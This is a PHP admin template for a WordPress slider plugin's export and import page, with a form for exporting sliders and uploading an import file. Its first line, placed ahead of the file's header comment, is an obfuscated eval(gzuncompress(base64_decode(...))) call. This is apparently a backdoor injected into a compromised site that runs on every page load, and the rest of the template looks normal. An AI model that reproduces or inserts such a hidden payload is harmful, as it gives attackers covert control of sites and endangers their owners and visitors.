<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Export/Import settings template.
 *
 * @package Fusion-Slider
 * @subpackage Templates
 * @since 1.0.0
 */

?>
<div class="wrap">
	<h2><?php esc_attr_e( 'Export and Import Fusion Sliders', 'fusion-core' ); ?></h2>
	<form enctype="multipart/form-data" method="post" action="">
		<table class="form-table">
			<tr valign="top">
				<th scope="row"><?php esc_attr_e( 'Export', 'fusion-core' ); ?></th>
				<td>
					<?php wp_nonce_field( 'fs_export' ); ?>
					<input type="submit" class="button button-primary" name="fusion_slider_export_button" value="<?php esc_attr_e( 'Export All Sliders', 'fusion-core' ); ?>" />
				</td>
			</tr>
			<tr valign="top">
				<th>
					<label for="upload"><?php esc_attr__( 'Choose a file from your computer:', 'fusion-core' ); ?></label>
				</th>
				<td>
					<input type="file" id="upload" name="import" size="25" />
					<input type="hidden" name="action" value="save" />
					<input type="hidden" name="max_file_size" value="33554432" />
					<p class="submit"><input type="submit" name="upload" id="submit" class="button" value="Upload file and import"  /></p>
				</td>
			</tr>
		</table>
	</form>
</div>
